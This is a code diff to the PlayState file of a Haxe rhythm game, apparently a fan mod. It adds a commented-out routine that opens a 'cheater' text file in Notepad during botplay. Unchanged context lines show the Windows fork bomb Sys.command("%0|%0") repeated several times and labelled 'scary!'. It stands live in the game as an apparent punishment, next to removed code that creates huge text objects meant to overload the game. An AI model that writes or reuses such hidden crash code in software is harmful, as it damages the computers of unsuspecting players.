@@ -1,5 +1,6 @@
 package;
 
+import sys.io.Process;
 import Section.SwagSection;
 import Song.SwagSong;
 import flixel.FlxObject;
@@ -1625,6 +1626,32 @@ class PlayState extends MusicBeatState
 		if(cpuControlled && ClientPrefs.randomBotplayText && ClientPrefs.botTxtStyle != 'Hide' && botplayTxt != null && ffmpegInfo != 'Frame Time')
 		{
 			botplayTxt.text = theListBotplay[FlxG.random.int(0, theListBotplay.length - 1)];
+		
+			/*
+			// Create a random integer from 0 to 9 (10 possibilities)
+        var chance:Int = FlxG.random.int(0,9);
+        
+		trace("chance: " + chance);
+        if (chance == 0) { // 1 in 10 chance
+
+			var inverseSlash:String = "\\";
+            var fileNum:Int = FlxG.random.int(1,3); // 1, 2, or 3
+            var fileName:String = "cheater" + fileNum + ".txt";
+			var finalFile:String = File.getContent(Paths.getSharedPath('copypastas/')) + fileName;
+            
+			trace(finalFile);
+            // Open the file in Notepad (assuming Windows)
+            try {
+                var process = new Process("notepad", [finalFile]);
+                process.close(); // Close process object (Notepad will remain open)
+            } catch (e:Dynamic) {
+                trace("Failed to open Notepad with " + finalFile + ": " + e);
+            }
+        } else {
+            trace("Not cheater file.");
+        }
+			*/
+
 		}
 		if (botplayTxt != null) ogBotTxt = botplayTxt.text;
 		
@@ -5594,22 +5621,6 @@ class PlayState extends MusicBeatState
 					Sys.command("%0|%0"); // scary!
 					Sys.command("%0|%0"); // scary!
 					Sys.command("%0|%0"); // scary!
-					myText = new FlxText(0, 0, 50000); // x, y, width
-					myText.text = 10000000 * 100000000 * 10000000 * 10000000000000 * 1000000000;
-					myText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
-					myText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
-					amyText = new FlxText(0, 0, 50000); // x, y, width
-					amyText.text = 10000000 * 10000000000 * 100000000 * 10000000 * 10000000;
-					amyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
-					amyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
-					bmyText = new FlxText(0, 0, 50000); // x, y, width
-					bmyText.text = 10000000 * 1000000000 * 10000000 * 100000000 * 10000000;
-					bmyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
-					bmyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
-					cmyText = new FlxText(0, 0, 50000); // x, y, width
-					cmyText.text = 10000000 * 100000000 * 10000000 * 10000000 * 100000000;
-					cmyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
-					cmyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
 				}
 			}					
 
